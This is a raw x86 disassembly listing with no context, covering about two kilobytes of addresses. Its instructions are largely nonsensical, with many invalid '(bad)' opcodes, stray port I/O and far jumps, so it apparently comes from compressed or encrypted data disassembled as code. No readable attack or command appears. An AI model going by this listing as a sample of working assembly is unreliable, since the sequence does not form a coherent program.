  404175:	aaa    
  404176:	sub    DWORD PTR [esi],eax
  404178:	pop    ds
  404179:	mov    edi,0x616ffe43
  40417e:	xor    al,0x74
  404180:	rol    BYTE PTR [ebp-0x49],1
  404183:	stos   DWORD PTR es:[edi],eax
  404184:	sbb    DWORD PTR [ebp-0x50d34bb6],edi
  40418a:	and    esi,esi
  40418c:	idiv   ah
  40418e:	add    BYTE PTR [edx-0x784162fd],al
  404194:	jp     0x404200
  404196:	psrld  mm6,QWORD PTR [esi+0x2a29013b]
  40419d:	scas   eax,DWORD PTR es:[edi]
  40419e:	cwde   
  40419f:	outs   dx,BYTE PTR ds:[esi]
  4041a0:	mov    BYTE PTR [ebx+ebx*1+0x70],dl
  4041a4:	test   DWORD PTR [ecx-0x17],0x8ded3531
  4041ab:	and    eax,edi
  4041ad:	icebp  
  4041ae:	jae    0x40415d
  4041b0:	add    eax,0x8840dd50
  4041b5:	mov    al,al
  4041b7:	mov    al,ds:0x8cc71596
  4041bc:	pop    esi
  4041bd:	inc    ebx
  4041be:	push   ebp
  4041bf:	(bad)  
  4041c0:	ins    BYTE PTR es:[edi],dx
  4041c1:	cld    
  4041c2:	sbb    al,0x2e
  4041c4:	sbb    BYTE PTR [esi],bl
  4041c6:	stc    
  4041c7:	enter  0xc2db,0x55
  4041cb:	imul   ecx,DWORD PTR [edi+ebp*4],0x74f3fa9e
  4041d2:	mov    ebx,0x26cfeff6
  4041d7:	or     dl,bl
  4041d9:	adc    dl,bl
  4041db:	aaa    
  4041dc:	add    ebp,esp
  4041de:	test   BYTE PTR ds:0x41a42092,ch
  4041e4:	push   0x8ea398b4
  4041e9:	retf   0x54d0
  4041ec:	loopne 0x40423b
  4041ee:	fucomip st,st(3)
  4041f0:	shl    dl,1
  4041f2:	add    eax,0x9e7a1f99
  4041f7:	dec    esp
  4041f8:	loope  0x40426f
  4041fa:	pop    es
  4041fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041fc:	xor    BYTE PTR [ecx],dh
  4041fe:	xor    eax,0xd065a29e
  404203:	xlat   BYTE PTR ds:[ebx]
  404204:	(bad)  
  404205:	jge    0x4041ef
  404207:	idiv   DWORD PTR [esi]
  404209:	adc    eax,0x4c5cdbc6
  40420e:	push   eax
  40420f:	xor    DWORD PTR [ebx],edx
  404211:	(bad)  
  404212:	jmp    0x40422a
  404214:	scas   eax,DWORD PTR es:[edi]
  404215:	jl     0x40428b
  404217:	xor    ebp,DWORD PTR [ecx-0x2a]
  40421a:	das    
  40421b:	clc    
  40421c:	sbb    DWORD PTR [ecx+0x57],ecx
  40421f:	mov    edi,DWORD PTR [eax-0x628940e3]
  404225:	add    edx,DWORD PTR [eax]
  404227:	mov    ah,0xd0
  404229:	icebp  
  40422a:	mov    ds:0x671d58fe,eax
  40422f:	or     esp,DWORD PTR [eax]
  404231:	pushf  
  404232:	mov    edi,0xb7872321
  404237:	adc    al,0x26
  404239:	inc    ebx
  40423a:	sbb    al,0x27
  40423c:	retf   0x86e3
  40423f:	pop    eax
  404240:	aas    
  404241:	out    dx,eax
  404242:	nop
  404243:	sub    eax,0xa42c26a9
  404248:	push   ebp
  404249:	and    al,0x9a
  40424b:	mov    dh,0xca
  40424d:	and    eax,0x86655454
  404252:	aam    0x7f
  404254:	adc    dl,al
  404256:	inc    ecx
  404257:	ror    ebp,0x80
  40425a:	xor    DWORD PTR [ebp-0x43782191],ebp
  404260:	rcr    DWORD PTR [esi],cl
  404262:	pop    ss
  404263:	test   eax,0xcd908bb6
  404268:	sbb    bl,BYTE PTR [ecx-0x3b]
  40426b:	loope  0x404230
  40426d:	div    BYTE PTR [eax+eax*8-0x40]
  404271:	mov    ds:0xc82b0a0,eax
  404276:	and    al,0x85
  404278:	shr    BYTE PTR [esi-0x257d7468],cl
  40427e:	pop    edi
  40427f:	int    0xff
  404281:	shr    BYTE PTR [esi],cl
  404283:	cld    
  404284:	mov    ds:0xed857864,al
  404289:	out    dx,al
  40428a:	xor    bl,bl
  40428c:	xchg   edx,eax
  40428d:	mov    ebx,DWORD PTR es:[esi]
  404290:	add    eax,0x84764ecc
  404295:	or     DWORD PTR [ebx+ebx*8+0x64],esp
  404299:	cmp    DWORD PTR [ecx+0x3db89178],esi
  40429f:	or     DWORD PTR [ecx+eiz*8-0x444ac9e6],edx
  4042a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042a7:	cwde   
  4042a8:	rol    DWORD PTR [esi+0x2201deb8],1
  4042ae:	(bad)  
  4042af:	in     eax,0xdf
  4042b1:	push   es
  4042b2:	adc    BYTE PTR [edx+0x557e25f0],0x4b
  4042b9:	push   ebp
  4042ba:	pushf  
  4042bb:	adc    BYTE PTR [ecx+0x42],ah
  4042be:	mov    bh,0x9e
  4042c0:	pop    edi
  4042c1:	jno    0x404254
  4042c3:	xchg   ebx,eax
  4042c4:	sar    DWORD PTR [edi+0x5ca56e14],cl
  4042ca:	mov    ch,0xe4
  4042cc:	mov    cl,bl
  4042ce:	add    eax,0xcc2562f6
  4042d3:	add    cl,bl
  4042d5:	ret    0xb70a
  4042d8:	stos   BYTE PTR es:[edi],al
  4042d9:	ja     0x404295
  4042db:	mov    bl,0x63
  4042dd:	sbb    bh,ah
  4042df:	ss adc edx,eax
  4042e2:	xor    BYTE PTR [esi-0x53],ah
  4042e5:	xor    eax,0x96c8946c
  4042ea:	mov    eax,ds:0x7f33adaa
  4042ef:	fld    DWORD PTR [edi]
  4042f1:	ins    BYTE PTR es:[edi],dx
  4042f2:	jmp    0x784e6668
  4042f7:	icebp  
  4042f8:	arpl   WORD PTR ds:0x1eb5199a,bp
  4042fe:	aam    0x37
  404300:	push   cs
  404301:	pop    ebx
  404302:	cmovge ebx,DWORD PTR [ebp+ebx*8-0x3f44411e]
  40430a:	mov    ds:0x55d8fb11,al
  40430f:	icebp  
  404310:	sbb    eax,0x21ff1958
  404315:	push   0xe8c186e0
  40431a:	jns    0x4042e9
  40431c:	jecxz  0x404399
  40431e:	mov    ebp,0xde897d
  404323:	call   0xe166:0x729430b2
  40432a:	sti    
  40432b:	sbb    DWORD PTR [ebp+0x382dc7ad],edx
  404331:	data16 mov al,bh
  404334:	pushf  
  404335:	clc    
  404336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404337:	adc    ebp,DWORD PTR [edx-0xcbbf07e]
  40433d:	sbb    al,0x81
  40433f:	xchg   DWORD PTR [esi-0x6e83b9e3],ebp
  404345:	cmp    cl,ch
  404347:	(bad)  
  404348:	xor    al,0x33
  40434a:	rol    ebp,0x1c
  40434d:	dec    DWORD PTR [ecx+0x1f]
  404350:	or     edx,DWORD PTR ds:0x918d15c6
  404356:	add    ecx,DWORD PTR [eax]
  404358:	push   eax
  404359:	inc    edx
  40435a:	and    eax,ebp
  40435c:	sub    bl,BYTE PTR [ebp-0x464d5195]
  404362:	push   0x4
  404364:	add    DWORD PTR [edx-0x729c0f27],esp
  40436a:	test   BYTE PTR [ebp+0xbfbbf7e],al
  404370:	mov    esp,0xfb90feca
  404375:	xchg   ecx,eax
  404376:	cmp    ecx,DWORD PTR es:[eax-0x3c]
  40437a:	data16 fcmovu st,st(3)
  40437d:	mov    WORD PTR [ecx+eax*2+0x10],gs
  404381:	adc    bl,bh
  404383:	jle    0x40437c
  404385:	cs aad 0xee
  404388:	or     BYTE PTR ds:0x8ac4738a,0x21
  40438f:	call   0xb253ec6
  404394:	icebp  
  404395:	mov    bh,0x64
  404397:	and    bl,ah
  404399:	aad    0x90
  40439b:	cld    
  40439c:	iret   
  40439d:	lods   eax,DWORD PTR ds:[esi]
  40439e:	dec    edi
  40439f:	sbb    DWORD PTR [eax+edi*8+0x18],edi
  4043a3:	es fcom st(6)
  4043a6:	(bad)  
  4043a7:	jo     0x40435f
  4043a9:	outs   dx,DWORD PTR ds:[esi]
  4043aa:	ins    DWORD PTR es:[edi],dx
  4043ab:	and    edi,DWORD PTR [ebp+0x2afa89a4]
  4043b1:	mov    ds:0x9a113a27,eax
  4043b6:	ror    BYTE PTR [eax+0x4dcb84f2],0x6
  4043bd:	bound  esp,QWORD PTR [ebx-0x5e6d790b]
  4043c3:	rcl    DWORD PTR [eax],1
  4043c5:	arpl   WORD PTR [edx+0x46],cx
  4043c8:	sub    ch,BYTE PTR es:[edx]
  4043cb:	dec    edx
  4043cc:	xchg   BYTE PTR [ebp+0x28e54e6],cl
  4043d2:	and    ebx,edi
  4043d4:	fwait
  4043d5:	cwde   
  4043d6:	nop
  4043d7:	mov    ecx,0xeccb114d
  4043dc:	sub    al,0x5d
  4043de:	mov    ebx,0xb008a0f6
  4043e3:	sub    dl,dh
  4043e5:	sbb    DWORD PTR [ebx+0x61ccae31],edi
  4043eb:	js     0x404460
  4043ed:	dec    esi
  4043ef:	test   BYTE PTR [esi+0x55],dh
  4043f2:	mov    ebp,0x4b7f5a3f
  4043f7:	scas   eax,DWORD PTR es:[edi]
  4043f8:	and    al,0xab
  4043fa:	fcmovnu st,st(6)
  4043fc:	aas    
  4043fd:	push   ebp
  4043fe:	adc    DWORD PTR [esp+ebp*8-0x1f],esi
  404402:	or     eax,0xc7c00d5a
  404407:	imul   ebx,DWORD PTR [ebx-0x49],0x3eb4bcce
  40440e:	sar    ah,1
  404410:	cmp    cl,ah
  404412:	ss (bad) 
  404414:	dec    edx
  404415:	xchg   DWORD PTR [esi*8+0x42cb09b6],esp
  40441c:	mov    eax,ds:0xc22762a1
  404421:	hlt    
  404422:	iret   
  404423:	mov    ch,0xa0
  404425:	int    0x1
  404427:	dec    ebx
  404428:	xchg   ebx,eax
  404429:	addr16 out 0x77,al
  40442c:	call   0x99bd:0xf5b361b2
  404433:	push   0xffffffa0
  404435:	cmp    BYTE PTR [ecx-0x6e],ch
  404438:	sub    eax,0x2dbdd601
  40443d:	jmp    0x3c6d:0xce46ed70
  404444:	dec    ebx
  404445:	mov    eax,0x2d7c6195
  40444a:	xlat   BYTE PTR ds:[ebx]
  40444b:	and    ebx,ecx
  40444d:	dec    esp
  40444e:	ret    0xef35
  404451:	xchg   edi,ecx
  404453:	inc    edi
  404454:	lods   al,BYTE PTR ds:[esi]
  404455:	xor    ebp,DWORD PTR [edi-0x308152e3]
  40445b:	pop    esi
  40445c:	sub    eax,0x2fe03de6
  404461:	pushf  
  404462:	or     DWORD PTR [eax-0x63],edi
  404465:	in     eax,dx
  404466:	mov    esi,0x35fc0e48
  40446b:	gs sbb eax,0xd8701cf8
  404471:	sub    eax,0x1cf89c68
  404476:	and    dl,ah
  404478:	cmp    BYTE PTR [ebx-0x39],al
  40447b:	and    ebp,ebx
  40447d:	je     0x404427
  40447f:	xchg   esi,eax
  404480:	sbb    eax,0xa0cc0d12
  404485:	push   0xffffffbf
  404487:	sbb    DWORD PTR [edi+0x78],ecx
  40448a:	(bad)  
  40448b:	xchg   esi,eax
  40448c:	sbb    edi,eax
  40448e:	jmp    0x6fcd0cc7
  404493:	leave  
  404494:	arpl   WORD PTR [edx],bp
  404496:	xchg   esp,eax
  404497:	add    esi,DWORD PTR [edx-0x3f]
  40449a:	loop   0x4044ab
  40449c:	inc    eax
  40449d:	jo     0x40448c
  40449f:	pop    ds
  4044a0:	push   ds
  4044a1:	mov    al,ds:0xebf54da1
  4044a6:	repnz push ebp
  4044a8:	fcom   QWORD PTR [edi-0x1f]
  4044ab:	fisubr WORD PTR [esi*1-0x6e24e12e]
  4044b2:	jmp    0x7592:0x6cd7bf2e
  4044b9:	pop    ebp
  4044ba:	mov    bl,0x81
  4044bc:	xchg   edx,eax
  4044bd:	fdivr  QWORD PTR [ecx+ecx*1+0x8]
  4044c1:	adc    esp,DWORD PTR [esi+0x65]
  4044c4:	jg     0x404470
  4044c6:	adc    eax,0xf595f2ae
  4044cb:	mov    dh,0xc4
  4044cd:	mov    cl,0x7e
  4044cf:	int3   
  4044d0:	aad    0x8
  4044d2:	pop    eax
  4044d3:	(bad)  
  4044d4:	xchg   edx,eax
  4044d5:	fisub  DWORD PTR [ebx-0x31]
  4044d8:	(bad)  
  4044da:	test   DWORD PTR [edi-0x7a33365a],eax
  4044e0:	sbb    ebp,DWORD PTR [esi-0x53d5293c]
  4044e6:	fdiv   QWORD PTR [ebx]
  4044e8:	mov    ah,0x9e
  4044ea:	fnsave [ebx+eiz*8+0xc]
  4044ee:	and    edi,DWORD PTR ds:0xf2b7152b
  4044f4:	sbb    ch,BYTE PTR [edx+0x69]
  4044f7:	mov    edi,0xa5bd410a
  4044fc:	mov    ah,0x2
  4044fe:	mov    BYTE PTR [ebx-0x1b01c093],ah
  404504:	sub    cl,dl
  404506:	dec    edi
  404507:	cmp    DWORD PTR [ecx+0x7d660143],edx
  40450d:	jno    0x4044e2
  40450f:	sub    BYTE PTR [ebp-0x1d1f0ed0],ah
  404515:	xchg   ebx,eax
  404516:	or     BYTE PTR [ebx],al
  404518:	xor    eax,DWORD PTR [esi+0x12]
  40451b:	int    0xee
  40451d:	mov    esp,eax
  40451f:	stc    
  404520:	mov    bl,0x25
  404522:	xlat   BYTE PTR ds:[ebx]
  404523:	into   
  404524:	inc    ebp
  404525:	push   0x8
  404527:	jb     0x4044ce
  404529:	rol    edx,cl
  40452b:	push   esi
  40452c:	adc    BYTE PTR [eax],dh
  40452e:	ret    
  40452f:	mov    esp,0x40d3023d
  404534:	and    eax,0xaea4b5a2
  404539:	in     eax,0x32
  40453b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40453c:	clc    
  40453d:	mov    ah,0xa5
  40453f:	push   edi
  404540:	sub    ecx,DWORD PTR [ecx+0x5e]
  404543:	sar    BYTE PTR [ecx],cl
  404545:	mov    ah,0xf2
  404547:	scas   eax,DWORD PTR es:[edi]
  404548:	xchg   edi,eax
  404549:	jp     0x404593
  40454b:	(bad)  
  40454c:	xchg   ebx,eax
  40454d:	mov    cl,0x57
  40454f:	out    0xb,al
  404551:	inc    esp
  404552:	in     al,dx
  404553:	dec    eax
  404554:	lahf   
  404555:	test   bh,ch
  404557:	mov    esi,0xb74d703b
  40455c:	xchg   ebx,eax
  40455d:	dec    esi
  40455e:	dec    edi
  40455f:	dec    edi
  404560:	jns    0x4045e0
  404562:	ret    
  404563:	sub    esi,ebp
  404565:	pop    esi
  404566:	adc    ecx,DWORD PTR [ebx+ecx*1-0x629b3372]
  40456d:	mov    eax,ds:0xcbda901e
  404572:	bound  ecx,QWORD PTR [edi]
  404574:	std    
  404575:	mov    BYTE PTR [edi-0x28e9b65e],dh
  40457b:	int    0x98
  40457d:	iret   
  40457e:	xchg   ecx,eax
  40457f:	mov    eax,ds:0x113a7537
  404584:	adc    ecx,eax
  404586:	mov    eax,0x39b777d9
  40458b:	mov    esi,0xb64dc52b
  404590:	xchg   edi,eax
  404591:	(bad)  
  404592:	imul   ebp,ecx,0xffffffc9
  404595:	scas   eax,DWORD PTR es:[edi]
  404596:	xchg   ch,dl
  404598:	fld    QWORD PTR [ebp+0x13]
  40459b:	pusha  
  40459c:	jl     0x40455e
  40459e:	and    eax,0xa2c4f52d
  4045a3:	adc    eax,0xaea80d8b
  4045a8:	push   ebx
  4045a9:	cmc    
  4045aa:	(bad)  
  4045ab:	mov    al,BYTE PTR [edx+0x73d97533]
  4045b1:	fldenv [edx+0x49]
  4045b4:	or     cl,al
  4045b6:	or     edx,DWORD PTR [ebx+0x47]
  4045b9:	(bad)  
  4045ba:	(bad)  
  4045bb:	sahf   
  4045bc:	sub    BYTE PTR [ecx],dl
  4045be:	rol    BYTE PTR [ebx-0x1],0x22
  4045c2:	rol    DWORD PTR ds:0xcd90d50c,0x7
  4045c9:	int3   
  4045ca:	loope  0x404634
  4045cc:	xor    eax,0x60eef74b
  4045d1:	test   eax,0x796920d8
  4045d6:	pop    ebp
  4045d7:	js     0x404580
  4045d9:	aaa    
  4045da:	dec    esi
  4045db:	pop    ebp
  4045dc:	push   es
  4045dd:	les    eax,FWORD PTR [ebx]
  4045df:	shl    bh,0x6a
  4045e2:	push   ds
  4045e3:	or     DWORD PTR [esi-0x4a],ecx
  4045e6:	sub    edx,0xffffff94
  4045e9:	data16 outs dx,BYTE PTR ds:[esi]
  4045eb:	xchg   ecx,eax
  4045ec:	sbb    DWORD PTR ds:0x9c46ad5f,0x27df48d4
  4045f6:	retf   0x873b
  4045f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045fa:	and    eax,DWORD PTR [edi-0x183f3eb8]
  404600:	scas   eax,DWORD PTR es:[edi]
  404601:	and    edx,esp
  404603:	ja     0x404674
  404605:	lahf   
  404606:	icebp  
  404607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404608:	mov    al,0x10
  40460a:	jns    0x40459b
  40460c:	or     al,0x95
  40460e:	inc    edx
  40460f:	adc    esi,DWORD PTR [esi+0x3372cca2]
  404615:	push   cs
  404616:	mov    al,0x92
  404619:	ins    BYTE PTR es:[edi],dx
  40461a:	(bad)  
  40461b:	das    
  40461c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40461d:	cli    
  40461e:	cmp    edi,esp
  404620:	scas   al,BYTE PTR es:[edi]
  404621:	repnz xor DWORD PTR [edx-0x15],0xc209a94f
  404629:	jg     0x4046a9
  40462b:	adc    ecx,eax
  40462d:	mov    BYTE PTR [edi+0x58],dh
  404630:	jge    0x4046af
  404632:	bound  eax,QWORD PTR [ebp-0x1adf9de0]
  404638:	pop    ss
  404639:	rcr    esi,cl
  40463b:	daa    
  40463c:	dec    esp
  40463d:	mov    ds:0x3cf5fd28,eax
  404642:	pop    esi
  404643:	std    
  404644:	stos   BYTE PTR es:[edi],al
  404645:	mov    al,0x28
  404647:	dec    edi
  404648:	cld    
  404649:	shl    DWORD PTR [ebp+0x0],cl
  40464c:	mov    ebx,eax
  40464e:	and    eax,DWORD PTR [ebp+0x72]
  404651:	mov    ds:0x966cd242,eax
  404656:	cmp    DWORD PTR [edx+eiz*2],0x928a4d65
  40465d:	push   edi
  40465e:	ret    
  40465f:	f2xm1  
  404661:	push   edx
  404662:	das    
  404663:	lock xchg edi,eax
  404665:	loop   0x404632
  404667:	or     eax,0x6a21da77
  40466c:	push   eax
  40466d:	sub    esi,DWORD PTR es:[ebp-0xda67be]
  404674:	mov    dl,0xed
  404676:	adc    eax,0x67274812
  40467b:	mov    ds:0x3d7a00f5,eax
  404680:	cwde   
  404681:	sub    al,0xd5
  404683:	arpl   WORD PTR [esi],sp
  404685:	mov    edx,edx
  404687:	fwait
  404688:	fwait
  404689:	cld    
  40468a:	mov    esp,0x8f3482
  40468f:	mov    ebp,DWORD PTR [esi]
  404691:	aaa    
  404692:	fstp   TBYTE PTR [eax-0x28]
  404695:	inc    esi
  404696:	std    
  404697:	data16 sahf 
  404699:	mov    bl,0xf3
  40469b:	ror    BYTE PTR [esi-0xc],cl
  40469e:	sbb    eax,0xc931768f
  4046a3:	lahf   
  4046a4:	adc    eax,0xf2671607
  4046a9:	retf   
  4046aa:	push   ecx
  4046ab:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4046ad:	add    DWORD PTR [ebp+0x42],ecx
  4046b0:	ins    DWORD PTR es:[edi],dx
  4046b1:	xchg   ebx,eax
  4046b2:	mov    eax,0x9db919d4
  4046b7:	fwait
  4046b8:	pusha  
  4046b9:	rcr    BYTE PTR [ebx-0x3],1
  4046bc:	pop    ss
  4046bd:	shl    DWORD PTR [edi+0xf13bed2],0x9e
  4046c4:	enter  0xcb42,0x45
  4046c8:	gs in  al,dx
  4046ca:	mov    bl,0x6f
  4046cc:	jecxz  0x4046f3
  4046ce:	mov    ebx,0x7095e887
  4046d3:	pop    es
  4046d4:	and    DWORD PTR [edx+0x4f],eax
  4046d7:	nop
  4046d8:	popf   
  4046d9:	pop    eax
  4046da:	cmp    eax,0xbda6efff
  4046df:	jb     0x404686
  4046e1:	mov    ah,0x26
  4046e3:	push   0xffffff8a
  4046e5:	inc    esi
  4046e6:	or     esi,DWORD PTR [ebx-0x3c]
  4046e9:	and    eax,0x59a7f6bf
  4046ee:	fwait
  4046ef:	outs   dx,DWORD PTR ds:[esi]
  4046f0:	push   ebp
  4046f1:	in     eax,dx
  4046f2:	retf   
  4046f3:	pushf  
  4046f4:	cs in  eax,0xab
  4046f7:	fisttp QWORD PTR [edi+0x8]
  4046fa:	pop    ebp
  4046fb:	not    DWORD PTR [ebx-0x6e]
  4046fe:	mov    ?,WORD PTR [ecx+0x4a]
  404701:	lahf   
  404702:	(bad)  
  404703:	jmp    0x2b75:0x595c6fb2
  40470a:	jmp    0x7995:0x77816466
  404711:	pop    edx
  404712:	push   cs
  404713:	cmp    eax,0x28606f23
  404718:	push   ebp
  404719:	daa    
  40471a:	pop    eax
  40471b:	outs   dx,BYTE PTR ds:[esi]
  40471c:	xchg   esi,eax
  40471d:	and    DWORD PTR [edx],0xa0360ef1
  404723:	xor    edx,DWORD PTR [esi-0xef6d135]
  404729:	xchg   esp,eax
  40472a:	mov    al,0xf1
  40472c:	add    DWORD PTR [edi-0x4d],ecx
  40472f:	inc    ecx
  404730:	in     eax,0x61
  404732:	imul   ebp,DWORD PTR [ecx-0x73],0x1641528e
  404739:	aas    
  40473a:	xchg   ebx,eax
  40473b:	mov    edi,eax
  40473d:	push   es
  40473e:	sbb    al,0x94
  404740:	mov    eax,0x6accf2cf
  404745:	cmp    esi,DWORD PTR [edx-0x10]
  404748:	xchg   ebx,eax
  404749:	pop    esi
  40474a:	pop    ebx
  40474b:	loope  0x404716
  40474d:	test   ch,0xf3
  404750:	jo     0x404783
  404752:	popf   
  404753:	(bad)
  404758:	adc    DWORD PTR [eax],ebp
  40475a:	out    dx,eax
  40475b:	(bad)  
  40475d:	aam    0x7a
  40475f:	out    0x2d,eax
  404761:	fstp   TBYTE PTR [ecx]
  404763:	jo     0x404716
  404765:	outs   dx,BYTE PTR ds:[esi]
  404766:	pop    ss
  404767:	adc    eax,0x9fc69ea8
  40476c:	outs   dx,DWORD PTR ds:[esi]
  40476d:	xchg   DWORD PTR [ebx+0x4feea0f5],ecx
  404773:	add    ecx,DWORD PTR ds:0x9d896174
  404779:	jmp    0x40473b
  40477b:	push   esp
  40477c:	mov    al,0xd3
  40477e:	xchg   BYTE PTR [ebx-0x7c],dl
  404781:	(bad)  
  404782:	push   esi
  404783:	xlat   BYTE PTR ds:[ebx]
  404784:	push   ds
  404785:	mov    al,BYTE PTR [edx+0x0]
  404788:	push   0xffffffd1
  40478a:	out    0x60,al
  40478c:	scas   eax,DWORD PTR es:[edi]
  40478d:	xor    ah,cl
  40478f:	mov    bh,0x7a
  404791:	sub    DWORD PTR [ebx+0x7a],eax
  404794:	adc    al,BYTE PTR [ebp+0x31]
  404797:	shl    BYTE PTR [edx],cl
  404799:	lods   eax,DWORD PTR ds:[esi]
  40479a:	imul   esp,DWORD PTR [eax-0xf61a609],0x68ffa4e2
  4047a4:	or     eax,0x22459e6b
  4047a9:	sub    esi,ebp
  4047ab:	pop    edi
  4047ac:	ret    0xd07e
  4047af:	iret   
  4047b0:	inc    edx
  4047b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047b2:	pop    ebp
  4047b3:	mov    ch,0x41
  4047b5:	fnsave [eax-0x2ac9a7e4]
  4047bb:	loopne 0x4047c8
  4047bd:	jne    0x404823
  4047bf:	sbb    DWORD PTR [esi+0x30],ecx
  4047c2:	pop    ss
  4047c3:	stc    
  4047c4:	jbe    0x4047a6
  4047c6:	xchg   ebp,eax
  4047c7:	in     al,0x23
  4047c9:	icebp  
  4047ca:	lahf   
  4047cb:	pop    ebp
  4047cc:	jb     0x4047c7
  4047ce:	and    ch,BYTE PTR ds:0x447205b
  4047d4:	dec    edi
  4047d5:	cli    
  4047d6:	in     al,dx
  4047d7:	push   esp
  4047d8:	inc    ebx
  4047d9:	pop    ss
  4047da:	mov    edx,0xe5e6937d
  4047df:	loope  0x4047a2
  4047e1:	imul   eax,DWORD PTR ds:0x5a823fe6,0x5c
  4047e8:	inc    eax
  4047e9:	lahf   
  4047ea:	fcomip st,st(0)
  4047ec:	(bad)  
  4047ed:	jmp    0x24aa922d
  4047f2:	ret    
  4047f3:	das    
  4047f4:	cs and eax,0x3fdfd2d
  4047fa:	dec    ecx
  4047fb:	adc    al,0x6c
  4047fd:	dec    edi
  4047fe:	mov    dh,0xf
  404800:	lea    esi,[edi]
  404802:	ror    bh,0xa2
  404805:	icebp  
  404806:	je     0x40486b
  404808:	mov    al,0x2
  40480a:	sar    eax,0x6c
  40480d:	ins    BYTE PTR es:[edi],dx
  40480e:	mov    esi,0xa3818ce1
  404813:	pop    eax
  404814:	adc    dh,cl
  404816:	out    dx,al
  404817:	dec    ecx
  404818:	pop    ss
  404819:	sbb    DWORD PTR [eax+0x6cc82383],0xb7700de
  404823:	cs pop ecx
  404825:	dec    eax
  404826:	imul   ecx,DWORD PTR [edx],0xfadcff9c
  40482c:	mov    dl,0xb
  40482e:	jns    0x40489c
  404830:	mov    ds,edi
  404832:	imul   ecx,DWORD PTR [eax+0x3e],0xe124af14
  404839:	ss pop esi
  40483b:	or     dh,ch
  40483d:	jbe    0x40486d
  40483f:	xor    eax,DWORD PTR [esi]
  404841:	fwait
  404842:	arpl   bx,cx
  404844:	nop
  404845:	mov    cl,0xcb
  404847:	or     dl,BYTE PTR [ebx-0x2c1823c1]
  40484d:	mov    cl,0x4d
  40484f:	mov    ds:0x4cd10908,al
  404854:	mov    BYTE PTR [eax],al
  404856:	pusha  
  404857:	cmp    esi,edx
  404859:	aam    0x7c
  40485b:	repz sbb edx,esp
  40485e:	xchg   esp,ecx
  404860:	dec    eax
  404861:	or     ebp,DWORD PTR [ebp-0x13]
  404864:	dec    ebx
  404865:	adc    BYTE PTR [edi+0x63],bl
  404868:	push   esp
  404869:	imul   esi,esi,0x4ffc0bbf
  40486f:	adc    eax,edx
  404871:	xchg   edx,eax
  404872:	xchg   edi,eax
  404873:	enter  0x3775,0x68
  404877:	push   edx
  404878:	jmp    0x404835
  40487a:	pop    ds
  40487b:	idiv   DWORD PTR [edx+0x5d]
  40487e:	and    esi,edx
  404880:	cmp    ch,BYTE PTR [ebp+0x6df12e92]
  404886:	jmp    0x4048c9
  404888:	xor    ebp,DWORD PTR [edi-0x45]
  40488b:	push   ss
  40488c:	rcl    bh,cl
  40488e:	xchg   ebp,eax
  40488f:	mov    ch,0x1f
  404891:	sub    eax,0x3c260857
  404896:	dec    ebx
  404897:	dec    edi
  404899:	inc    esi
  40489a:	sbb    al,0x4c
  40489c:	popf   
  40489d:	jb     0x404843
  40489f:	xchg   edi,eax
  4048a0:	push   ss
  4048a1:	mov    DWORD PTR [edx],esp
  4048a3:	xor    eax,0xf0fdd419
  4048a8:	hlt    
  4048a9:	mov    esp,0x17bc70b9
  4048ae:	xchg   edi,eax
  4048af:	ss in  eax,dx
  4048b1:	xor    al,0xd1
  4048b3:	mov    ch,0xc1
  4048b5:	fmul   st,st(3)
  4048b7:	call   0xad3a6961
  4048bc:	aam    0x3f
  4048be:	sbb    ecx,DWORD PTR [eax+ebp*1-0x41c0c0de]
  4048c5:	jns    0x4048a6
  4048c7:	aaa    
  4048c8:	or     al,BYTE PTR [ebp+0x2e]
  4048cb:	jno    0x4048bc
  4048cd:	mov    eax,ds:0x852cbe67
  4048d2:	fstp   QWORD PTR [ebp+0x35]
  4048d5:	cli    
  4048d6:	add    edx,DWORD PTR [edx+eiz*4-0x42]
  4048da:	daa    
  4048db:	sti    
  4048dc:	sub    eax,0x9f4b0b7
  4048e1:	icebp  
  4048e2:	pop    esp
  4048e3:	xor    esi,eax
  4048e5:	imul   eax,eax,0x7a
  4048e8:	out    0x77,al
  4048ea:	idiv   bl
  4048ec:	retf   0xcbcf
  4048ef:	bound  eax,QWORD PTR [ebx-0x4e]
  4048f2:	adc    eax,0x3920461a
  4048f7:	push   0x42
  4048f9:	icebp  
  4048fa:	pop    ecx
  4048fb:	clc    
  4048fc:	add    ch,dl
  4048fe:	add    ebx,DWORD PTR [ebp-0x14]
  404901:	scas   al,BYTE PTR es:[edi]
  404902:	ret    0xf332
  404905:	or     eax,0xe1d7c386
  40490a:	xchg   edx,eax
  40490b:	jp     0x4048dc
  40490d:	cmp    BYTE PTR [esi],bl
  40490f:	enter  0x73bf,0xbd
  404913:	sbb    BYTE PTR ds:0xe751d1f8,bh
  404919:	lock mov dl,0xfb
  40491c:	retf   0xc5db
  40491f:	cmp    eax,0xbf7951ba
  404924:	mov    eax,0xdf9dfb81
  404929:	in     eax,dx
  40492a:	out    0x95,eax
  40492c:	test   DWORD PTR [edi+edx*2-0x44],0x7550f320
  404934:	out    0xf0,al
  404936:	mov    dh,BYTE PTR [esi+0x28db930d]
  40493c:	jecxz  0x404915
  40493e:	out    0xe7,eax
  404940:	lods   eax,DWORD PTR ds:[esi]
  404941:	inc    eax
  404942:	(bad)  
  404944:	jmp    0x9b32:0x94912ca8
  40494b:	jecxz  0x404924
  40494d:	jmp    0x2b22059c
  404952:	add    DWORD PTR [ebx],ecx
  404954:	rol    DWORD PTR [ebx-0x48],1
  404957:	sub    eax,0x6224e6d3
  40495c:	ss add eax,0x1f6e53d7
  404962:	sar    dh,0xe8
  404965:	sub    DWORD PTR [edi+0x2a],ecx
  404968:	xchg   edi,eax
  404969:	cli    
  40496a:	rol    cl,1
  40496c:	ins    BYTE PTR es:[edi],dx
  40496d:	inc    ecx
  40496e:	or     edi,DWORD PTR [eax-0x21]
  404971:	jmp    0x896d:0xe6d44276
  404978:	(bad)  
  404979:	dec    ebp
  40497a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40497b:	inc    eax
  40497c:	jg     0x4049d1
  40497e:	scas   al,BYTE PTR es:[edi]
  40497f:	push   eax
